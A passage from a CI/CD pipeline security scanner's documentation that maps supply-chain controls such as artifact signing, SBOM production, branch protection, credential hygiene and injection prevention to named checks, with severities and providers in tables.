| [`DF-014`](#detail-df-014) | WORKDIR set to a system / kernel filesystem path | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-015`](#detail-df-015) | RUN grants world-writable permissions (chmod 777 / a+w) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-017`](#detail-df-017) | ENV PATH prepends a world-writable directory | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-018`](#detail-df-018) | RUN chown rewrites ownership of a system path | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-023`](#detail-df-023) | ENV sets a dynamic-loader hijack variable | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-030`](#detail-df-030) | ENV NODE_OPTIONS preloads code or opens an inspector | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DR-002`](#detail-dr-002) | Step runs with privileged: true | <span class="pg-sev pg-sev--high">HIGH</span> | [Drone CI](../providers/drone.md) |  |
| [`DR-007`](#detail-dr-007) | Step mounts a sensitive host path | <span class="pg-sev pg-sev--high">HIGH</span> | [Drone CI](../providers/drone.md) |  |
| [`GCB-019`](#detail-gcb-019) | Shell entrypoint inlines a user substitution into args | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GHA-012`](#detail-gha-012) | Self-hosted runner without ephemeral marker | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-026`](#detail-gha-026) | Container job disables isolation via `options:` | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-014`](#detail-gl-014) | Self-managed runner without ephemeral tag | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`JF-003`](#detail-jf-003) | Pipeline uses `agent any` (no executor isolation) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-014`](#detail-jf-014) | Agent label missing ephemeral marker | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`K8S-005`](#detail-k8s-005) | Container securityContext.privileged: true | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`K8S-006`](#detail-k8s-006) | Container allowPrivilegeEscalation not explicitly false | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`K8S-007`](#detail-k8s-007) | Container runAsNonRoot not true / runAsUser is 0 | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`K8S-008`](#detail-k8s-008) | Container readOnlyRootFilesystem not true | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`K8S-009`](#detail-k8s-009) | Container capabilities not dropping ALL / adding dangerous caps | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-010`](#detail-k8s-010) | Container seccompProfile not RuntimeDefault or Localhost | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-013`](#detail-k8s-013) | Pod uses a hostPath volume | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`K8S-014`](#detail-k8s-014) | Pod hostPath references a sensitive host directory | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-023`](#detail-k8s-023) | Namespace missing Pod Security Admission enforcement label | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-031`](#detail-k8s-031) | Namespace missing PSA warn label | <span class="pg-sev pg-sev--low">LOW</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-035`](#detail-k8s-035) | Container securityContext.runAsUser is 0 | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-039`](#detail-k8s-039) | Pod uses shareProcessNamespace: true | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-040`](#detail-k8s-040) | Container securityContext.procMount: Unmasked | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`TKN-002`](#detail-tkn-002) | Tekton step runs privileged or as root | <span class="pg-sev pg-sev--high">HIGH</span> | [Tekton](../providers/tekton.md) |  |
| [`TKN-004`](#detail-tkn-004) | Tekton Task mounts hostPath or shares host namespaces | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Tekton](../providers/tekton.md) |  |
| [`TKN-013`](#detail-tkn-013) | Tekton sidecar runs privileged or as root | <span class="pg-sev pg-sev--high">HIGH</span> | [Tekton](../providers/tekton.md) |  |

### ESF-D-SIGN-ARTIFACTS: Sign build artifacts and verify signatures before release { #ctrl-esf-d-sign-artifacts }

**Evidenced by 28 checks** across 12 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, GitHub Actions, GitLab CI, Jenkins, OCI manifest, Tekton).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-006`](#detail-ado-006) | Artifacts not signed | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-024`](#detail-ado-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ARGO-009`](#detail-argo-009) | Artifacts not signed (no cosign/sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
| [`ARGO-011`](#detail-argo-011) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
| [`ATTEST-001`](#detail-attest-001) | SLSA provenance attests an untrusted builder identity | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
| [`BB-006`](#detail-bb-006) | Artifacts not signed | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-024`](#detail-bb-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-009`](#detail-bk-009) | Artifacts not signed (no cosign/sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`BK-011`](#detail-bk-011) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CC-006`](#detail-cc-006) | Artifacts not signed (no cosign/sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-024`](#detail-cc-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CP-002`](#detail-cp-002) | Artifact store not encrypted with customer-managed KMS key | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`ECR-005`](#detail-ecr-005) | Repository encrypted with AES256 rather than KMS CMK | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`GCB-008`](#detail-gcb-008) | No vulnerability scanning step in Cloud Build pipeline | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GCB-023`](#detail-gcb-023) | Step references a user substitution not declared in substitutions: | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GHA-006`](#detail-gha-006) | Artifacts not signed (no cosign/sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-024`](#detail-gha-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-006`](#detail-gl-006) | Artifacts not signed | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-024`](#detail-gl-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`JF-006`](#detail-jf-006) | Artifacts not signed | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-028`](#detail-jf-028) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`LMB-001`](#detail-lmb-001) | Lambda function has no code-signing config | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`OCI-002`](#detail-oci-002) | Image is missing a build attestation manifest | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
| [`S3-002`](#detail-s3-002) | Artifact bucket server-side encryption not configured | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`SIGN-001`](#detail-sign-001) | No AWS Signer profile defined for Lambda deploys | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`SIGN-002`](#detail-sign-002) | AWS Signer profile is revoked or inactive | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`TKN-009`](#detail-tkn-009) | Artifacts not signed (no cosign/sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |
| [`TKN-011`](#detail-tkn-011) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |

### ESF-D-SBOM: Produce SBOM / provenance metadata with every build { #ctrl-esf-d-sbom }

**Evidenced by 26 checks** across 13 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, GitHub Actions, GitLab CI, Jenkins, OCI manifest, Tekton).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-007`](#detail-ado-007) | SBOM not produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-024`](#detail-ado-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ARGO-010`](#detail-argo-010) | No SBOM generated for build artifacts | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
| [`ATTEST-003`](#detail-attest-003) | SBOM contains floating-version dependencies | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [OCI manifest](../providers/oci.md) |  |
| [`ATTEST-007`](#detail-attest-007) | SBOM packages lack supplier / originator attribution | <span class="pg-sev pg-sev--low">LOW</span> | [OCI manifest](../providers/oci.md) |  |
| [`BB-007`](#detail-bb-007) | SBOM not produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-024`](#detail-bb-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-010`](#detail-bk-010) | No SBOM generated for build artifacts | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CC-007`](#detail-cc-007) | SBOM not produced (no CycloneDX/syft/Trivy-SBOM step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-024`](#detail-cc-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`DF-016`](#detail-df-016) | Image lacks OCI provenance labels | <span class="pg-sev pg-sev--low">LOW</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`ECR-002`](#detail-ecr-002) | Image tags are mutable | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`GCB-009`](#detail-gcb-009) | Artifacts not signed (no cosign / sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GCB-015`](#detail-gcb-015) | SBOM not produced (no CycloneDX / syft / Trivy-SBOM step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GCB-024`](#detail-gcb-024) | Build pushes Docker images but top-level images: is empty | <span class="pg-sev pg-sev--low">LOW</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GHA-007`](#detail-gha-007) | SBOM not produced (no CycloneDX/syft/Trivy-SBOM step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-024`](#detail-gha-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-007`](#detail-gl-007) | SBOM not produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-024`](#detail-gl-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`JF-007`](#detail-jf-007) | SBOM not produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-028`](#detail-jf-028) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`OCI-001`](#detail-oci-001) | Image manifest is missing OCI provenance annotations | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [OCI manifest](../providers/oci.md) |  |
| [`OCI-003`](#detail-oci-003) | Image manifest is missing the ``image.created`` annotation | <span class="pg-sev pg-sev--low">LOW</span> | [OCI manifest](../providers/oci.md) |  |
| [`OCI-005`](#detail-oci-005) | Image manifest is missing the ``image.licenses`` annotation | <span class="pg-sev pg-sev--low">LOW</span> | [OCI manifest](../providers/oci.md) |  |
| [`S3-003`](#detail-s3-003) | Artifact bucket versioning not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`TKN-010`](#detail-tkn-010) | No SBOM generated for build artifacts | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |

### ESF-D-CODE-REVIEW: Require peer review of source and pipeline configuration { #ctrl-esf-d-code-review }

**Evidenced by 35 checks** across 3 providers (AWS, Helm, SCM).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`CB-007`](#detail-cb-007) | CodeBuild webhook has no filter group | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CB-008`](#detail-cb-008) | CodeBuild buildspec is inline (not sourced from a protected repo) | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CB-010`](#detail-cb-010) | CodeBuild webhook allows fork-PR builds without actor filtering | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CCM-001`](#detail-ccm-001) | CodeCommit repository has no approval rule template attached | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CP-001`](#detail-cp-001) | No approval action before deploy stages | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CP-003`](#detail-cp-003) | Source stage using polling instead of event-driven trigger | <span class="pg-sev pg-sev--low">LOW</span> | [AWS](../providers/aws.md) |  |
| [`CP-007`](#detail-cp-007) | CodePipeline v2 PR trigger accepts all branches | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`HELM-006`](#detail-helm-006) | Chart.yaml does not declare a kubeVersion compatibility range | <span class="pg-sev pg-sev--low">LOW</span> | [Helm](../providers/helm.md) |  |
| [`SCM-001`](#detail-scm-001) | Default branch has no protection rule | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-002`](#detail-scm-002) | Default branch protection does not require pull request reviews | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-007`](#detail-scm-007) | Default branch protection allows force-pushes | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-008`](#detail-scm-008) | Default branch protection does not require status checks | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-009`](#detail-scm-009) | Default branch protection allows branch deletion | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-010`](#detail-scm-010) | Branch protection allows administrators to bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-011`](#detail-scm-011) | Default branch protection does not require CODEOWNERS reviews | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-012`](#detail-scm-012) | Default branch protection keeps stale reviews after a push | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-013`](#detail-scm-013) | Default branch protection does not require conversation resolution | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`SCM-014`](#detail-scm-014) | Default branch protection does not require approval of the most recent push | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-017`](#detail-scm-017) | Repository has no CODEOWNERS file | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-018`](#detail-scm-018) | Required PR reviews can be bypassed by named identities | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-019`](#detail-scm-019) | Push restrictions allowlist names individual users | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`SCM-021`](#detail-scm-021) | Actions can approve pull requests (self-approval bypass) | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-026`](#detail-scm-026) | Webhook ships events insecurely (HTTP / no-TLS / no-secret) | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-028`](#detail-scm-028) | Private repo allows forking | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-029`](#detail-scm-029) | Repository ruleset is in evaluate / disabled mode (not enforced) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-030`](#detail-scm-030) | Repository ruleset has bypass actor with bypass_mode: always | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-031`](#detail-scm-031) | Repo allows auto-merge (no human-timing gate) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-032`](#detail-scm-032) | Active ruleset doesn't require a PR review (governance theater) | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-033`](#detail-scm-033) | Active ruleset doesn't require status checks | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-034`](#detail-scm-034) | Active ruleset doesn't block force-push | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-035`](#detail-scm-035) | Active ruleset doesn't block branch deletion | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`SCM-037`](#detail-scm-037) | Active ruleset's pull_request rule doesn't dismiss stale reviews | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-038`](#detail-scm-038) | Active ruleset doesn't require linear history | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`SCM-039`](#detail-scm-039) | Active ruleset doesn't pin a required workflow | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`SCM-042`](#detail-scm-042) | Active ruleset doesn't require merge queue | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |

### ESF-D-TOKEN-HYGIENE: Use short-lived, federated credentials (OIDC), not long-lived tokens { #ctrl-esf-d-token-hygiene }

**Evidenced by 27 checks** across 11 providers (AWS, Azure DevOps, Bitbucket, CircleCI, Cloud Build, CloudFormation, GitHub Actions, GitLab CI, Jenkins, SCM, Terraform).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-014`](#detail-ado-014) | AWS auth uses long-lived access keys | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-011`](#detail-bb-011) | AWS auth uses long-lived access keys | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-028`](#detail-bb-028) | OIDC step without deployment-gated environment | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`CB-006`](#detail-cb-006) | CodeBuild source auth uses long-lived token | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CC-005`](#detail-cc-005) | AWS auth uses long-lived access keys in environment block | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-031`](#detail-cc-031) | OIDC role assumption without branch filter or approval gate | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) |  |
| [`CF-001`](#detail-cf-001) | Inline credential parameter on a CloudFormation resource | <span class="pg-sev pg-sev--high">HIGH</span> | [CloudFormation](../providers/cloudformation.md) |  |
| [`CP-004`](#detail-cp-004) | Legacy ThirdParty/GitHub source action (OAuth token) | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`GCB-013`](#detail-gcb-013) | Package install bypasses registry integrity (git / path / tarball) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GCB-020`](#detail-gcb-020) | serviceAccount points at the default Cloud Build service account | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GHA-005`](#detail-gha-005) | AWS auth uses long-lived access keys | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-030`](#detail-gha-030) | OIDC token requested without environment-protected job | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-037`](#detail-gha-037) | actions/checkout persists GITHUB_TOKEN into .git/config | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-050`](#detail-gha-050) | Publish step relies on long-lived registry token | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-054`](#detail-gha-054) | actions/checkout with ssh-key persists SSH credential in repo | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-061`](#detail-gha-061) | GitHub App token minted without a `permissions:` filter | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-013`](#detail-gl-013) | AWS auth uses long-lived access keys | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-031`](#detail-gl-031) | id_tokens: missing audience pin or environment binding | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`IAM-005`](#detail-iam-005) | CI/CD role trust policy missing sts:ExternalId | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`IAM-007`](#detail-iam-007) | IAM user has access key older than 90 days | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`IAM-008`](#detail-iam-008) | OIDC-federated role trust policy missing audience or subject pin | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`JF-004`](#detail-jf-004) | AWS auth uses long-lived access keys via withCredentials | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-010`](#detail-jf-010) | Long-lived AWS keys exposed via environment {} block | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`SCM-020`](#detail-scm-020) | Default workflow GITHUB_TOKEN has write permission | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-025`](#detail-scm-025) | Repo has write-enabled deploy keys (push backdoor) | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SM-001`](#detail-sm-001) | Secrets Manager secret has no rotation configured | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`TF-001`](#detail-tf-001) | aws_iam_access_key declares a long-lived access key | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Terraform](../providers/terraform.md) |  |

### ESF-D-INJECTION: Prevent script / template injection from untrusted pipeline context { #ctrl-esf-d-injection }

**Evidenced by 71 checks** across 13 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, Drone CI, GitHub Actions, GitLab CI, Jenkins, Tekton).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-002`](#detail-ado-002) | Script injection via attacker-controllable context | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-010`](#detail-ado-010) | Cross-pipeline `download:` ingestion unverified | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-011`](#detail-ado-011) | `template: <local-path>` on PR-validated pipeline | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-012`](#detail-ado-012) | Cache@2 key derives from $(System.PullRequest.*) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-019`](#detail-ado-019) | `extends:` template on PR-validated pipeline points to local path | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-026`](#detail-ado-026) | Pipeline contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-027`](#detail-ado-027) | Dangerous shell idiom (eval, sh -c variable, backtick exec) | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-030`](#detail-ado-030) | pool interpolates attacker-controllable value | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ARGO-005`](#detail-argo-005) | Argo input parameter interpolated unsafely in script / args | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Argo Workflows](../providers/argo.md) |  |
| [`BB-002`](#detail-bb-002) | Script injection via attacker-controllable context | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-010`](#detail-bb-010) | Deploy step ingests pull-request artifact unverified | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-018`](#detail-bb-018) | Cache key derives from attacker-controllable input | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-025`](#detail-bb-025) | Pipeline contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-026`](#detail-bb-026) | Dangerous shell idiom (eval, sh -c variable, backtick exec) | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) |  |
